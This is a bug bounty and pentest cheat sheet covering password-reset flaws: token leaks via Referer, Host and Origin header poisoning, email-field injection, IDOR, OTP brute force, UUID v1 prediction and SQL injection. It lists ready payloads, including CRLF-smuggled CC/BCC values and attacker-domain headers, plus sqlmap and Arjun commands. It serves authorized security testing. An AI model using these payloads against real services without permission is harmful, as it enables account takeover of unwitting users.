# Password Reset — Bug Bounty & Pentest 

---

## Phase 1 — Critical: Direct Account Takeover

## 1 — Token Leak via Referer Header

**What is it?** When you open a reset link, the full URL (including the token) is stored in your browser. If you click any external link on that page, your browser automatically sends the full URL in the `Referer` header to the external site — leaking the token to a third party.

**Steps:**

1. Request a password reset → open the link from your email
2. Do NOT change the password yet
3. Click any external link on the page (Facebook icon, Twitter, footer link)
4. In Burp, check the outgoing request → look at the Referer header
5. If the reset token appears in Referer → report it

**What to look for:**

```
Referer: https://target.com/reset?token=abc123XYZ  ← leaked!
```

 **References:** H1 #342693, H1 #272379

---

## 2 — Host Header Injection (Reset Poisoning)

**What is it?** The app uses the `Host` header from the request to build the reset link it sends to the victim. If you change the `Host` header to your own server, the victim receives an email with your domain in the link. When they click it, the token goes to you instead of the real site.

**Steps:**

1. Intercept the reset request in Burp
2. Change the Host header to your attacker server (try each payload below)
3. Forward the request → victim gets an email with your domain in the link
4. When victim clicks → token goes to your server → full account takeover

**Payloads — try one at a time:**

```
Host: attacker.com
─────────────────────────────────────────
Host: target.com
X-Forwarded-Host: attacker.com
─────────────────────────────────────────
Host: target.com
Host: attacker.com                    (double Host)
─────────────────────────────────────────
Host: target.com
 Host: attacker.com                   (space before 2nd line)
─────────────────────────────────────────
\x1dHost: evilbucket.com              (Amazon S3 bypass)
Host: victim.com
─────────────────────────────────────────
Host: hacker.com?.victim.com
Host: hacker.com/example.com
Host: mydomain.com%23@www.example.com
Host: account.hacker.com              (subdomain variant)
```

 **References:** H1 #226659, H1 #167631

---

## 3 — Email Parameter Injection

**What is it?** The app takes the email from the request body and sends the reset link to it. If the backend doesn't validate the email field properly, you can inject a second email address using different separators — so the reset link gets sent to both the victim and the attacker.

**Steps:**

1. Intercept the password reset POST request
2. Try adding your email using each payload below
3. Check your attacker inbox — if you receive the reset link → valid bug

**URL-Encoded Payloads:**

```
email=victim@x.com&email=attacker@x.com
email=victim@x.com%20email=attacker@x.com
email=victim@x.com|attacker@x.com
email=victim@x.com,attacker@x.com
email=victim@x.com/attacker@x.com
email="victim@x.com",email="attacker@x.com"
user[email][]=victim@x.com&user[email][]=attacker@x.com
email=victim@x.com&code=123456
email=victim => no domain
email=victim@xyz => no TLD
```

**Email Header Injection (CC/BCC):**

```
email=victim@x.com%0a%0dcc:attacker@x.com
email="victim@x.com%0a%0dbcc:attacker@x.com"
email=victim@x.com%0Acc:attacker@x.com
email=victim@x.com%0Abcc:attacker@x.com
email=victim@x.com%0D%0Acc:attacker@x.com
email="victim@x.com\r\n \ncc: attacker@x.com"
```

**JSON Payloads:**

```json
{"email":"victim@x.com","email":"attacker@x.com"}
{"email":["victim@x.com","attacker@x.com"]}
{"email":"victim@x.com\nattacker@x.com"}
{"email":"victim@x.com,attacker@x.com"}
{"email":"victim@x.com;attacker@x.com"}
{"email":"victim@x.com%0Abcc:attacker@x.com","email":"victim@x.com"}
{"email":"victim@x.com%0D%0Acc:attacker@x.com","email":"victim@x.com"}
{"email":"victim@x.com","email":"victim@x.com%0D%0Abcc:attacker@x.com"}
{"email":"victim@x.com\r\n \ncc: attacker@x.com","email":"victim@x.com"}
```


---

## 4 — OTP or Token Exposed in HTTP Response

**What is it?** After you request a reset, the server sometimes includes the OTP or token directly in the API response body — even though it should only be sent to the email. This means an attacker can read it from the response without ever accessing the victim's email.

**Steps:**

1. Trigger a password reset request
2. Look at the server response body in Burp
3. Search for the OTP or token string inside the JSON/HTML response
4. If visible in the response → attacker gets it without accessing the email

> ⚠️ This completely bypasses email ownership verification


---

## 5 — IDOR — Change Victim's Password via Reset Link

**What is it?** When you submit the new password after clicking the reset link, the app sends the email or user ID in the request body to identify who to update. If the server doesn't verify that the token belongs to that email, you can swap the email to the victim's and change their password.

**Steps:**

1. Open your own reset link → fill in a new password → intercept the final POST
2. Check if the email or user ID is included in the request body
3. Change the email to victim@target.com → forward
4. If accepted → victim's password is now changed

**Payload:**

```http
POST /reset/confirm
token=abc123&email=victim@target.com&password=hacked!
```

 **References:** H1 #315879

---

## 6 — Origin Header Manipulation

**What is it?** Similar to Host header injection, but using the `Origin` header. Some apps trust the `Origin` header to build the reset link URL. If you change it to your server, the reset link may point to your domain.

**Steps:**

1. Intercept the reset request → add or change the Origin header
2. Try each payload — check if the reset link domain changes in victim's email
3. Or check if it leaks in CORS response headers

**Payloads:**

```
Origin: attacker.com
Origin: https://burpcollaborator.net
Origin: hacker.com?.victim.com
Origin: example.com.hacker.com
Origin: wwwexample.com
Origin: mydomain.com%23@www.example.com
Origin: mydomain.com%0D%0A@www.example.com
```


---

## 7 — Registration as Password Reset (Upsert ATO)

**What is it?** Some apps use an "upsert" pattern in their registration endpoint — meaning if the email already exists, they update the record instead of rejecting it. This silently becomes a pre-authentication password reset with no token or ownership check needed.

**Steps:**

1. Find the registration/signup endpoint (e.g., `/api/register`)
2. Send a POST request with the victim's existing email and a new password you control
3. If the app accepts it without error → victim's password has been changed
4. Try logging in with victim's email and your new password

**Payload:**

```http
POST /api/register
Content-Type: application/json

{"email":"victim@example.com","password":"MyNewPassword123!"}
```


---

## 8 — Arbitrary Reset via skipOldPwdCheck (Pre-Auth)

**What is it?** Some apps have an internal parameter like `skipOldPwdCheck=true` that bypasses old password verification. If this parameter is exposed in an unauthenticated endpoint, anyone can reset any account's password without logging in or having a valid token.

**Steps:**

1. Find the change/recover password endpoint
2. Send the request without being logged in, adding the bypass parameter
3. If the password is changed → the endpoint is exposed to unauthenticated users

**Payload:**

```http
POST /hub/rpwd.php
Content-Type: application/x-www-form-urlencoded

action=change_password&user_name=admin&confirm_new_password=Hacked123!
```

> Also try hidden params like `skipOldPwdCheck=true`, `role=admin`, `admin=true`


---

## Phase 2 — High: Logic Flaws & Session Issues

## 9 — Reset Link Stays Valid After Email Change

**What is it?** When you change your email address, all previously issued reset links should be invalidated because they were tied to the old email. If they still work, an attacker who had access to your old email can still take over your account.

**Steps:**

1. Request a password reset → do NOT click the link yet
2. Login to the account → go to settings → change email & verify it
3. Now click the old reset link from before
4. If the password changes successfully → bug (link should be invalidated)

**Category:** Session Management / Logic Flaw

---

## 10 — Reset Link Stays Valid After Password Change

**What is it?** After you change your password (either through reset or normally), all existing reset links should be invalidated. If an old reset link still works after a password change, an attacker with an old link can still take over the account.

**Steps:**

1. Request a password reset → do NOT click the link yet
2. Login to the account → change your password normally
3. Now click the old reset link
4. If it still allows changing the password → bug

**Category:** Session Management / Logic Flaw

---

## 11 — Password Reset Does Not Kill All Sessions

**What is it?** When you reset your password, the app should log out all active sessions on other devices — because those sessions may belong to an attacker who gained access. If old sessions stay alive, the password reset doesn't actually help.

**Steps:**

1. Login to the account in Chrome and Firefox at the same time
2. Reset the password in Chrome
3. Switch to Firefox — check if still logged in
4. If the old session still works → bug (all sessions should be killed on password change)

**Category:** Session Fixation / Account Security

---

## 12 — OTP Brute Force + Session Rotation Bypass

**What is it?** If the OTP is short (4–6 digits) and the rate limit is based on the session ID (not the account), you can bypass it by simply getting a new session after each block. This lets you brute force the OTP until you find the right one.

**Steps:**

1. Request reset → receive OTP → intercept submission in Burp
2. Send to Intruder → payload type: numbers (0000–9999)
3. If rate-limited → logout → get new session → re-request OTP → repeat
4. Watch for different response size or redirect on the correct OTP

**Payload:**

```http
POST /reset_password.php
recovery_code=§0000§
```

> Also try IP Rotator extension in Burp to bypass IP-based rate limits

---

## 13 — Reset Token Never Expires (After 24h)

**What is it?** Reset tokens should expire after a short time (usually 1–24 hours). If a token stays valid forever, an attacker who intercepts it (even much later) can still use it to take over the account.

**Steps:**

1. Request a reset → click the link → change the password
2. Wait 24 hours or more
3. Try clicking the same old reset link again
4. If it still loads the reset form → token has no expiry → bug

**Category:** Token Lifetime / Token Reuse

---

## 14 — UUID v1 Token → Sandwich Attack

**What is it?** UUID v1 is generated based on the current timestamp. This makes it predictable — if you know the time range when the victim's token was generated, you can enumerate all possible UUIDs in that range and find their token. The "sandwich" means you generate tokens just before and after the victim's to narrow the range.

**Steps:**

1. Request a reset → check the token format in the email link
2. Look at position 3 of the UUID — if it's "1" → it is UUID v1 (time-based)
3. Create two accounts → request tokens just before and after victim's reset
4. Use guidtool to generate all UUIDs between the two known timestamps
5. Try each generated UUID on the victim's reset endpoint

```
70d589f4-93b6-11ef-b864-0242ac120002
               ↑ "1" here = UUID v1 = time-based = predictable
```


---

## 15 — X-Forwarded Headers Trusted by Server

**What is it?** Some apps trust forwarded headers like `X-Forwarded-Host` to determine what domain to use when building the reset link. If the server blindly trusts these headers without validation, you can redirect the reset link to your server.

**Steps:**

1. Intercept the reset request in Burp
2. Add X-Forwarded-Host or X-Forwarded-For pointing to your server
3. Forward the request → check if victim's email contains your domain in the reset link

**Payloads:**

```
X-Forwarded-Host: burpcollaborator.net
X-Forwarded-For: burpcollaborator.net
Referer: https://attacker.com
```


---

## 16 — Use Your Own Token on Victim's Account

**What is it?** If the app doesn't bind the reset token to a specific account or email address, you can use your own valid token with the victim's email. The server just checks "is this a valid token?" without checking "does this token belong to this email?"

**Steps:**

1. Request a reset for your own account → get your valid token
2. Submit the victim's email with your own token in the request
3. If it resets the victim's password → token is not bound to the account → bug

**Payload:**

```http
POST /resetPassword
email=victim@x.com&code=MY_OWN_VALID_TOKEN
```

**Category:** Token Binding / Logic Flaw

---

## 17 — Response Manipulation → Bypass Error Page

**What is it?** Some apps check if a token or OTP is correct on the client side by reading the response message. If you intercept the response and change the error message to a success message, the app may proceed as if the token was correct — bypassing the verification entirely.

**Steps:**

1. Trigger the reset flow → enter a wrong OTP or token → intercept the server response
2. If you see a 401/403 error response → use Match & Replace to change it
3. Change status to 200 and message to "success" → forward → see if app proceeds

```
← server returns:
HTTP/1.1 401 Unauthorized
{"message":"unsuccessful","statusCode":403}

→ you change to:
HTTP/1.1 200 OK
{"message":"success","statusCode":200}
```


---

## Phase 3 — Medium: Info Leaks & Low-Impact Flaws

## 18 — No Rate Limiting → Email Bombing

**What is it?** If there's no limit on how many times you can request a reset email, you can flood the victim's inbox with hundreds of reset emails. This causes annoyance, stresses the mail server, and can cost the company money in email sending fees.

**Steps:**

1. Intercept the reset request → send to Intruder
2. Use null payload → set to unlimited or 500+ iterations
3. If no block or CAPTCHA appears → email bombing is possible

 **References:** H1 #280534

---

## 19 — Token Sent Over HTTP (Not HTTPS)

**What is it?** If the reset link uses `http://` instead of `https://`, the token travels over the network in plain text. Anyone on the same network (coffee shop, ISP) can intercept it. Also, web crawlers like the Wayback Machine may index the URL and store the token publicly.

**Steps:**

1. Request reset → check email → hover over or copy the reset link
2. Check the protocol at the start of the URL
3. If it starts with `http://` → report it

```
http://target.com/reset?token=abc123  ← NOT secure
https://target.com/reset?token=abc123 ← secure
```

**Category:** MITM / Transport Security / Wayback Machine indexing

---

## 20 — Token Exposed in Burp History / Frontend

**What is it?** Sometimes the reset token leaks not just in the email, but also in JavaScript files, hidden HTML fields, or API responses that load on the page. By searching your Burp history for the token, you can find unexpected places where it appears.

**Steps:**

1. Request a password reset → copy the token from your email
2. In Burp, press Ctrl+F → search for the token across all captured traffic
3. If found in a JS file, API response, or HTML source that isn't the reset email → bug


---

## 21 — Auth Bypass via Direct Navigation (Forced Browsing)

**What is it?** After triggering a reset or OTP flow, the app may redirect you to a verification page. If the app doesn't enforce that you actually passed verification before accessing account pages, you can skip the verification step entirely by navigating directly to the URL.

**Steps:**

1. Request a reset or OTP — do NOT submit it
2. Navigate directly to: `/profile`, `/account`, `/my-profile`, `/home`, `/dashboard`, `/change-password`
3. If any protected page loads without completing the reset → broken access control

**Category:** Forced Browsing / Auth Bypass

---

## Phase 4 — Injection & Discovery

## 22 — SQL Injection via Reset Code Field

**What is it?** The reset code or token field is often passed directly into a database query without proper sanitization. If the app is vulnerable, injecting SQL through this field can let you bypass verification or extract data from the database.

**Steps:**

1. Trigger a reset → intercept the request where you submit the token/code
2. Save the full raw request to a file called `request.txt`
3. Mark the injection point with `*` in the saved file
4. Run sqlmap against it

```bash
sqlmap -r request.txt --level=3 --risk=2 -p code --batch --dbs
```


---

## 23 — Hidden Parameter Discovery on Reset Endpoint

**What is it?** Apps sometimes have hidden parameters in their reset endpoint that aren't shown in the visible form — like `skipOldPwdCheck=true`, `admin=true`, or `role=admin`. These can allow privilege escalation or authentication bypass if found and manipulated.

**Steps:**

1. Identify the reset form URL
2. Run Arjun to find hidden POST parameters the app accepts
3. Test any discovered params for logic flaws, injection, or privilege escalation

```bash
arjun -u https://target.com/resetpass.php -m POST
```

> Look for params like: `skipOldPwdCheck`, `role`, `admin`, `debug`, `bypass`


---

## Pro Tips for Bug Bounty Reports

1. **Always use Burp Collaborator** — When testing Host Header or Referrer leaks, Collaborator gives you undeniable proof that the server sent a request to your machine. Screenshots alone aren't enough.
    
2. **Chain bugs for higher impact** — If you find "No Rate Limit" + "4-digit OTP", don't report them separately as two low-severity bugs. Chain them together and show they lead to Critical Account Takeover.
    
3. **Clean up your PoC** — Always use test accounts you control. Never test on real users without permission.
    
4. **Check all phases, not just one** — Most beginners only test rate limiting or brute force. The highest-paying bugs are usually in Phase 1 (token leaks, header injection) and Phase 2 (logic flaws).
    
5. **Use Burp Sequencer** on the token — Before anything else, analyze the randomness of the token. If it's weak or predictable, that opens the door to brute force and sandwich attacks.
    

---

